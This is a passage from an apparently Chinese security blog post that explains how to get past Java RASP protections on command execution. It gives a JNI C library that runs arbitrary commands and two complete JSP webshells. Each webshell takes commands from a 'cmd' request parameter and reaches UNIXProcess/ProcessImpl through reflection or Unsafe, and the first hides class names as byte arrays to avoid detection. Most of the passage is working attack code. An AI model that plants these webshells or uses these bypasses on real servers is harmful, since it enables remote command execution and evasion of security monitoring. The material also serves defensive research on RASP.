cmd)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将其编译成.class文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javac Command.java<br></code></pre></td></tr></table></figure><p>然后再用下面的命令生成c语言的.h头文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javah -jni Command<br></code></pre></td></tr></table></figure><p>然后再去编写Command.c文件</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Command.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jni.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">execmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];   <br>    FILE *pipe = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!pipe)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (!feof(pipe))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), pipe))<br>        &#123; <br>            <span class="hljs-built_in">strcat</span>(result, buffer);<br>        &#125;<br>    &#125;<br>    pclose(pipe); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;     <br>&#125;<br>JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_Command_exec</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <br>    execmd(cstr, result);<br>    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">strcat</span>(return_messge, result);<br>    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);<br>    <span class="hljs-keyword">return</span> cmdresult;<br>&#125;<br></code></pre></td></tr></table></figure><p>写好之后进行编译，编译成dll文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include&quot;</span> -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include\win32&quot;</span> -D__int64=<span class="hljs-string">&quot;long long&quot;</span> --shared <span class="hljs-string">&quot;D:\CTF\Java\JavaCode\JNITest\src\main\java\Command.c&quot;</span>  -o ./jni.dll<br></code></pre></td></tr></table></figure><blockquote><p>-D 是 <code>gcc</code> 编译器的一个预处理器参数，用于定义宏</p><p>-I用于指定额外的目录，让编译器在这些目录中搜索头文件</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241107203652320.png" alt="image-20241107203652320"></p><p>然后用System.load或者System.loads方法就可以加载这个dll，然后就可以实例化Command类调用他的native方法了</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>));<br><span class="hljs-comment">//        System.loadLibrary(&quot;jni&quot;); //load()指定绝对路径</span><br>        System.load(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JNITest\\src\\main\\java\\jni.dll&quot;</span>);<br>        <span class="hljs-type">Command</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ipconfig</span> <span class="hljs-operator">=</span> command.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        System.out.println(ipconfig);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个java.library.path是java搜索共享库的路径，如果用loadLibrary方法的话，他是不能带路径的，只能从java.library.path中搜索并加载，所以要用loadLibrary方法加载dll的话需要确保dll在搜寻路径下面</p></blockquote><p>执行就可以弹计算器了</p><p><img src="https://cdn.clown2024.cn/image-20241107204035199.png" alt="image-20241107204035199"></p><p>所以其实绕过就是能把我们写的so上传的服务当中去，可以通过java的webshell、文件上传、或者反序列化等方式，加载我们写好的so或者dll</p><p>这里有一些JNI命令执行的脚本例子：<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><h1 id="unixprocess绕过"><a href="#UNIXProcess绕过" class="headerlink" title="UNIXProcess绕过"></a>UNIXProcess绕过</h1><p>说实话一开始看到这个东西我是很懵的，根本没听过，看了一下才知道这个是Runtime.exec()调用链的末端，平时只会用并没有关注过相关的调用链</p><p>RASP有些针对命令执行的过滤就是对调用链中的<strong>java.lang.ProcessImpl.start</strong>方法进行过滤。</p><p><strong>那来分析一下命令执行的调用链</strong></p><p>参考文章：<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><code>Runtime.exec(xxx)</code>调用链如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)<br>java.lang.ProcessImpl.start(ProcessImpl.java:134)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)<br>java.lang.Runtime.exec(Runtime.java:620)<br>java.lang.Runtime.exec(Runtime.java:450)<br>java.lang.Runtime.exec(Runtime.java:347)<br></code></pre></td></tr></table></figure><p>所以平时用的ProcessBuilder.start的执行命令的方法也处于这个调用链上</p><p>ProcessBuilder执行命令</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc&quot;</span>).start();<br></code></pre></td></tr></table></figure><p>上面的调用栈是Linux的，从字面也可以看得到这是UNIXProcess，Windows的话我自己跟进发现他和Linux不同的就是最终那一步，UNIXProcess变成ProcessImpl.create</p><p><img src="https://cdn.clown2024.cn/image-20241108135939928.png" alt="image-20241108135939928"></p><p>在该native方法实现里面就会调用Windows的api来创建一个新的进程</p><p>这里还是继续跟着文章的Linux版本来分析，所以我们需要关注的就是<code>UNIXProcess</code>和<code>ProcessImpl</code>，在JDK9之后把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中</p><p>他们最终调用的native方法是forkAndExec方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>所以我们利用这个绕过RASP防御的原理就是他们防御的层数不够深，比如只到<code>ProcessBuilder.start()</code>方法，而我们只需要直接调用最终执行的<code>UNIXProcess/ProcessImpl</code>实现命令执行或者直接反射<code>UNIXProcess/ProcessImpl</code>的<code>forkAndExec</code>方法就可以绕过RASP实现命令执行了。</p><p>这是ProcessImpl实例化UNIXProcess的源码，主要是看看参数传递</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImpl</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> sun.misc.<span class="hljs-type">JavaIOFileDescriptorAccess</span> <span class="hljs-variable">fdAccess</span><br>        <span class="hljs-operator">=</span> sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ProcessImpl</span><span class="hljs-params">()</span> &#123;&#125;    <span class="hljs-comment">// Not instantiable</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                         result, <span class="hljs-number">0</span>,<br>                         bytes.length);<br>        result[result.length-<span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>)<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmdarray,</span><br><span class="hljs-params">                         java.util.Map&lt;String,String&gt; environment,</span><br><span class="hljs-params">                         String dir,</span><br><span class="hljs-params">                         ProcessBuilder.Redirect[] redirects,</span><br><span class="hljs-params">                         <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-keyword">assert</span> cmdarray != <span class="hljs-literal">null</span> &amp;&amp; cmdarray.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[cmdarray.length-<span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = cmdarray[i+<span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span>[] envc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">byte</span>[] envBlock = ProcessEnvironment.toEnvironmentBlock(environment, envc);<br><br>        <span class="hljs-type">int</span>[] std_fds;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirects == <span class="hljs-literal">null</span>) &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123; -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span> &#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">1</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">1</span>].file(),<br>                                              redirects[<span class="hljs-number">1</span>].append());<br>                    std_fds[<span class="hljs-number">1</span>] = fdAccess.get(f1.getFD());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">2</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">2</span>].file(),<br>                                              redirects[<span class="hljs-number">2</span>].append());<br>                    std_fds[<span class="hljs-number">2</span>] = fdAccess.get(f2.getFD());<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UNIXProcess</span><br>            (toCString(cmdarray[<span class="hljs-number">0</span>]),<br>             argBlock, args.length,<br>             envBlock, envc[<span class="hljs-number">0</span>],<br>             toCString(dir),<br>                 std_fds,<br>             redirectErrorStream);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close(); &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close(); &#125;<br>                <span class="hljs-keyword">finally</span> &#123; <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close(); &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>UNIXProcess接收 8个参数，其中envc是[1]与std_fds都是恒为-1的数组，redirectErrorStream不影响可为false，args.length 为 cmd.length - 1，argBlock的内容就是执行的命令内容。</p></blockquote><p>一个jsp的payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>, result, <span class="hljs-number">0</span>, bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// java.lang.UNIXProcess</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">unixClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 反射创建UNIXProcess或者ProcessImpl</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(unixClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            clazz = Class.forName(processClass);<br>        &#125;<br>        <span class="hljs-comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">assert</span> strs != <span class="hljs-literal">null</span> &amp;&amp; strs.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 创建UNIXProcess或者ProcessImpl实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// 获取命令执行的InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    &#125;<br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) &#123;<br>                charset = <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>            &#125;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>   <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[]                b   = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] str = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span>     <span class="hljs-operator">=</span> start(str);<br>        <span class="hljs-type">String</span>      <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="unsafeforkandexec绕过"><a href="#Unsafe-forkAndExec绕过" class="headerlink" title="Unsafe+forkAndExec绕过"></a>Unsafe+forkAndExec绕过</h2><p>那如果RASP把<code>UNIXProcess/ProcessImpl</code>类的构造方法给拦截了呢</p><p>那我们就需要利用java的一些特性来直接触发<code>forkAndExec</code>方法从而绕过过滤</p><p>具体的步骤如下：</p><ol><li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li><li>构造<code>forkAndExec</code>需要的参数并调用。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li></ol><p>因为不太好验证，直接copy一下Aiwin师傅的jsp payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] strs = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (strs != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>); <span class="hljs-comment">//通过get方法得到unsafe对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        